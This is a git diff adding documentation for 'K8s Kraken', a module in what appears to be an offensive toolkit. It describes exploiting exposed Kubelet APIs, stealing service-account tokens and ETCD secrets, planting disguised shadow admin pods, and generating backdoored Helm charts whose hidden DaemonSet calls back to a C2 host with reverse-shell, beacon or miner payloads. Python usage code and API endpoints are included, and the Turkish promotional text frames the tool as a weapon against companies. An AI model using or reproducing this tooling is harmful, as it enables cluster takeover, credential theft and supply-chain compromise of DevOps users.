@@ -222,6 +222,9 @@ monolith/
 │   ├── ssh_worm.py                 # SSH Worm & Key Harvester (~700 lines) [WORM]
 │   ├── docker_escape.py            # Docker Container Escape (~700 lines) [ESCAPE]
 │   │
+│   │   # � K8S KRAKEN - KUBERNETES WARFARE (February 2026)
+│   ├── k8s_warfare.py              # K8s Kraken - Kubelet Exploit & Helm Backdoor (~1000 lines) [KRAKEN]
+│   │
 │   │   # 🔗 SUPPLY CHAIN ATTACKS (February 2026)
 │   └── supply_chain_attack.py      # Supply Chain Attack Suite (~1400 lines) [CHAIN]
 │
@@ -244,6 +247,7 @@ monolith/
 │   ├── ssh_worm.html               # SSH worm control panel
 │   ├── docker_escape.html          # Docker escape techniques
 │   ├── supply_chain_attack.html    # Supply chain attack dashboard
+│   ├── k8s_warfare.html            # K8s Kraken - Kubernetes Warfare dashboard
 │   └── ...
 │
 ├── 📂 configs/                     # Configuration Files
@@ -1161,7 +1165,133 @@ BROWSER DETECTION SCRIPT:
 
 ---
 
-## 👻 DDexec - Fileless Linux Execution (February 2025)
+## � K8s Kraken - Kubernetes Warfare (February 2025)
+
+Kubernetes cluster'larının kralı ol. Kubelet API exploit'i ve Helm Chart backdoor'ları ile şirketlerin kalbine giden en kısa yolu kullan. DaemonSet persistence - silinen pod'lar geri döner!
+
+### 🔴 K8s Kraken Teknik Detayları
+
+\`\`\`
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                            🐙 K8S KRAKEN - KUBERNETES WARFARE                            │
+│              Container & Orchestration Domination • Kubelet Exploit • Helm Backdoor     │
+│                            tools/k8s_warfare.py (~1000 lines)                            │
+│                     💀 "DevOps'un Korkulu Rüyası - Cluster Hijack" 💀                   │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+ATTACK VECTORS:
+  🎯 KUBELET API EXPLOIT (Port 10250)
+    └── Anonymous authentication check
+    └── Pod enumeration (all namespaces)
+    └── Container RCE via /run endpoint
+    └── Service Account token theft
+    └── Shadow Admin Pod deployment
+    └── ETCD secret extraction
+
+  📦 HELM CHART BACKDOOR GENERATOR
+    └── 8 Chart templates (PostgreSQL, MySQL, Redis, MongoDB, Nginx, Prometheus, Grafana, Elasticsearch)
+    └── Hidden DaemonSet: "metrics-collector" 
+    └── Payload types: reverse_shell, beacon, miner
+    └── Base64-encoded payload in "telemetry" ConfigMap
+    └── Legitimate-looking Chart.yaml, values.yaml
+
+HOW IT WORKS:
+  1. Scan → Find exposed Kubelet API (10250)
+  2. Check → Anonymous auth allowed?
+  3. Exploit → List pods, exec in containers
+  4. Steal → SA tokens from /var/run/secrets
+  5. Persist → Deploy shadow pod or backdoor chart
+  6. Dominate → DaemonSet runs on ALL nodes
+
+STEALTH FEATURES:
+  ✓ Pod names blend with system components
+  ✓ Namespace: kube-system (looks native)
+  ✓ Image: alpine:latest (minimal footprint)
+  ✓ Labels: k8s-app: metrics-helper
+  ✓ DaemonSet auto-respawns deleted pods
+
+TARGET EXTRACTION:
+  🔑 Service Account Tokens → API Server access
+  🔐 ETCD Secrets → All cluster credentials
+  ☁️ Cloud Provider Creds → AWS_ACCESS_KEY, AZURE_*
+  📋 ConfigMaps → Database URLs, API keys
+\`\`\`
+
+### 💀 K8s Kraken Usage
+
+\`\`\`python
+from tools.k8s_warfare import KubeletExploiter, HelmBackdoorGenerator, HelmChartType
+
+# Kubelet API Exploit
+exploiter = KubeletExploiter()
+
+# Scan for exposed Kubelet
+result = exploiter.scan_kubelet("10.0.0.1", 10250)
+print(f"Exploitable: {result.auth_status.value == 'anonymous_allowed'}")
+
+# List all pods
+pods = exploiter.list_pods("10.0.0.1", 10250)
+for pod in pods:
+    print(f"{pod['namespace']}/{pod['name']} - Privileged: {pod.get('privileged')}")
+
+# Extract secrets
+secrets = exploiter.extract_secrets("10.0.0.1", 10250)
+for secret in secrets:
+    print(f"[{secret['type']}] {secret['pod']}: {secret['value'][:50]}...")
+
+# Generate Shadow Admin Pod
+shadow_yaml = exploiter.generate_shadow_pod_yaml(
+    name="coredns-helper",
+    namespace="kube-system",
+    callback_url="http://c2.attacker.com:4444",
+    privileged=True,
+    host_network=True,
+    host_pid=True
+)
+print(shadow_yaml)
+
+# Helm Chart Backdoor
+generator = HelmBackdoorGenerator()
+
+# Create backdoored PostgreSQL chart
+backdoor = generator.generate_chart(
+    chart_type=HelmChartType.POSTGRESQL,
+    callback_url="http://c2.attacker.com:4444",
+    payload_type="beacon",
+    include_daemonset=True  # Runs on ALL nodes
+)
+
+# Files generated
+for filename, content in backdoor.files.items():
+    print(f"{filename}: {len(content)} bytes")
+# Chart.yaml, values.yaml, templates/deployment.yaml, 
+# templates/service.yaml, templates/metrics-collector.yaml (hidden backdoor!)
+
+# DevOps runs: helm install mydb ./postgresql
+# Result: Your agent on EVERY node via DaemonSet! 🎯
+\`\`\`
+
+### 🔗 K8s Kraken API Endpoints
+
+\`\`\`
+  GET  /k8s-kraken/                       - K8s Kraken Dashboard
+  GET  /k8s-kraken/api/status             - Module availability
+  POST /k8s-kraken/api/kubelet/scan       - Scan Kubelet API
+  POST /k8s-kraken/api/kubelet/pods       - List pods via Kubelet
+  POST /k8s-kraken/api/kubelet/exec       - Exec command in container
+  POST /k8s-kraken/api/kubelet/secrets    - Extract secrets from pods
+  POST /k8s-kraken/api/kubelet/shadow-pod - Generate shadow admin pod YAML
+  POST /k8s-kraken/api/kubelet/etcd-script- Generate ETCD extraction script
+  GET  /k8s-kraken/api/helm/chart-types   - List available chart templates
+  POST /k8s-kraken/api/helm/generate      - Generate backdoored Helm chart
+  POST /k8s-kraken/api/helm/download      - Download chart as ZIP
+  POST /k8s-kraken/api/scan-range         - Scan IP range for Kubelet
+  GET  /k8s-kraken/api/attack-playbook    - Get K8s attack playbook
+\`\`\`
+
+---
+
+## �👻 DDexec - Fileless Linux Execution (February 2025)
 
 Linux'ta hayalet gibi hareket et. DDexec tekniği /proc/self/mem üzerinden binary'leri disk'e dokunmadan bellekte execute eder. noexec mount'ları bypass, forensic-resistant execution.
 
